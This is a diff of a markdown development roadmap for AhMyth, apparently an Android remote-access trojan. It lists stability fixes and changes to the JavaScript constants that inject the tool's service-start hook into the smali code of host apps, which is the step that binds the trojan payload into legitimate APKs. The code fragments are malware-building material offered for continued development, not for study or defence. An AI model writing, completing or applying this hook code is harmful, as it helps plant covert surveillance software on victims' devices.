@@ -1,4 +1,4 @@
-## Stability Updates:
+## <div align="center"><ins>Stability Updates</ins></div>
 
 - [x] 01: Figure out why AhMyth is so unstable on Windows machines!
 
@@ -6,15 +6,15 @@
 #
 - [ ] 02: Merge Client & Server upgrades from [@HiddenPirates](https://github.com/HiddenPirates) and then integrate the Java code responisble for allowing the new hook function to work
 #
-- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` file, with the new hook point variable...
+- [ ] 03: Replace the exported `orgAppKey` variable in the `Constants.js` & `AppCtrl` files, with the new hook point variable...
 ```js
 exports.hookPoint = "return-void";
 ```
-...then replace the exported `serviceSrc` variable in the `Constants.js` file with the new static hook metbod...
+...then replace the exported `serviceSrc` variable in the `Constants.js` & `AppCtrl` files, with the new static hook metbod...
 ```js
 exports.serviceSrc = '/n/n invoke-static {}, Lahmyth/mine/king/ahmyth/';
 ```
-...then replace the exported `serviceStart` variable in the `Constants.js` file.
+...then replace the exported `serviceStart` variable in the `Constants.js` & `AppCtrl` files.
 ```js
 exports.serviceStart = 'MainService;->start()V' +
 '/n/n' +
